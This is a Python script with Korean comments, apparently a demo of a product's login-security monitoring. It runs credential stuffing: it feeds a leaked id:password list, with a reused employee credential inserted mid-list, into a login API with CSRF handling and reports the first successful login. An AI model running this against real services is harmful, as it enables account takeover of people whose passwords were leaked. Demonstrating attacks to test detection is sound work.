#!/usr/bin/env python3
"""크리덴셜 스터핑 시연 (#770) — 유출 목록을 계정마다 한 번씩 로그인 API에 넣는다.

실제 로그인 화면과 같은 API(`POST /api/auth/login`, CSRF 포함)로 들어간다. IP는 흉내 내지 않는다.
비밀번호를 재사용한 직원 계정은 파일에 적지 않고 실행할 때 --reused로 목록 중간에 끼운다.
그 계정이 맞으면 "적중"을 띄우고 멈춘다 — 조작자가 그 계정으로 브라우저에서 이어 간다.

  python scripts/demo/credential_stuffing.py --reused dohyun.lee:비밀번호
  python scripts/demo/credential_stuffing.py --base-url https://서버주소 --reused dohyun.lee:비밀번호 --reused-at 50

로그인 보안 화면(관리자 › 접근 감시 › 로그인 보안)을 옆에 띄워 두고 돌린다.
"""
import argparse
import http.cookiejar
import json
import os
import sys
import time
import urllib.error
import urllib.request
from pathlib import Path

ATTACK_UA = 'python-requests/2.32 (credential-stuffing demo)'
DEFAULT_LIST = Path(__file__).with_name('leaked_accounts.example.txt')

RED, GREEN, YELLOW, DIM, BOLD, RESET = '\033[91m', '\033[92m', '\033[93m', '\033[2m', '\033[1m', '\033[0m'


class Client:
    def __init__(self, base: str):
        self.base = base
        self.jar = http.cookiejar.CookieJar()
        self.opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(self.jar))

    def _token(self) -> str | None:
        return next((c.value for c in self.jar if c.name == 'XSRF-TOKEN'), None)

    def login(self, login_id: str, password: str) -> int:
        if not self._token():
            self.opener.open(urllib.request.Request(self.base + '/api/auth/csrf', headers={'User-Agent': ATTACK_UA})).read()
        request = urllib.request.Request(
            self.base + '/api/auth/login',
            data=json.dumps({'loginId': login_id, 'password': password}).encode(),
            headers={'Content-Type': 'application/json', 'X-XSRF-TOKEN': self._token() or '', 'User-Agent': ATTACK_UA},
            method='POST')
        try:
            with self.opener.open(request) as response:
                return response.status
        except urllib.error.HTTPError as error:
            return error.code


def read_list(path: Path) -> list[tuple[str, str]]:
    rows = []
    for line in path.read_text(encoding='utf-8').splitlines():
        line = line.strip()
        if not line or line.startswith('#') or ':' not in line:
            continue
        login_id, password = line.split(':', 1)
        rows.append((login_id.strip(), password))
    return rows


def main() -> int:
    parser = argparse.ArgumentParser(description='크리덴셜 스터핑 시연 — 유출 목록을 로그인 API에 넣는다.')
    parser.add_argument('--base-url', default='http://localhost:8081')
    parser.add_argument('--list', type=Path, default=DEFAULT_LIST, help='한 줄에 아이디:비밀번호')
    parser.add_argument('--reused', help='비밀번호를 재사용한 직원 계정 아이디:비밀번호 (목록 중간에 끼운다)')
    parser.add_argument('--reused-at', type=int, default=50, help='재사용 계정을 넣을 순서(1부터). 경계 기준 30건 뒤에 둔다')
    parser.add_argument('--delay', type=float, default=0.4, help='시도 사이 초')
    parser.add_argument('--no-pause', action='store_true', help='시작 전 Enter를 기다리지 않는다')
    args = parser.parse_args()

    if os.name == 'nt':
        os.system('')  # 예전 Windows 콘솔에서도 색 코드를 켠다
    if hasattr(sys.stdout, 'reconfigure'):
        sys.stdout.reconfigure(errors='replace')

    rows = read_list(args.list)
    if args.reused:
        if ':' not in args.reused:
            parser.error('--reused는 아이디:비밀번호 모양이어야 합니다.')
        login_id, password = args.reused.split(':', 1)
        rows.insert(max(0, min(len(rows), args.reused_at - 1)), (login_id, password))
    if not rows:
        parser.error('목록이 비어 있습니다.')

    base = args.base_url.rstrip('/')
    client = Client(base)
    try:
        client.opener.open(urllib.request.Request(base + '/api/auth/csrf', headers={'User-Agent': ATTACK_UA})).read()
    except urllib.error.URLError as error:
        print(f'{base}에 연결할 수 없습니다: {error.reason}', file=sys.stderr)
        return 2

    print(f'{BOLD}$ python stuffing.py --list {args.list.name}{RESET}')
    print(f'{DIM}유출 목록 {len(rows)}줄 · 계정마다 한 번씩만 넣음 · 대상 {base}{RESET}')
    if not args.no_pause:
        input(f'{YELLOW}Enter를 누르면 시작합니다{RESET}')

    width = max(len(login_id) for login_id, _ in rows)
    failures = 0
    hit = None
    for index, (login_id, password) in enumerate(rows, start=1):
        status = client.login(login_id, password)
        tag = f'[{index:02d}/{len(rows)}] {login_id.ljust(width)}'
        if status == 200:
            hit = login_id
            print(f'{GREEN}{BOLD}{tag} ✔ 로그인 성공{RESET}')
            print(f'{DIM}        ↳ 다른 사이트와 같은 비밀번호를 쓰던 계정 · 세션 쿠키 받음{RESET}')
            break
        failures += 1
        print(f'{RED}{tag} ✖ 실패 ({status}){RESET}')
        time.sleep(args.delay)

    print(f'{BOLD}{"─" * 40}{RESET}')
    if hit:
        print(f'{BOLD}결과: 시도 {failures + 1}건 · 실패 {failures}건 · 적중 계정 1개 ({hit}){RESET}')
        print(f'{YELLOW}→ 이제 이 계정으로 브라우저에서 로그인해 이어 갑니다{RESET}')
    else:
        print(f'{BOLD}결과: 시도 {failures}건 · 적중 계정 0개{RESET}')
    return 0


if __name__ == '__main__':
    raise SystemExit(main())
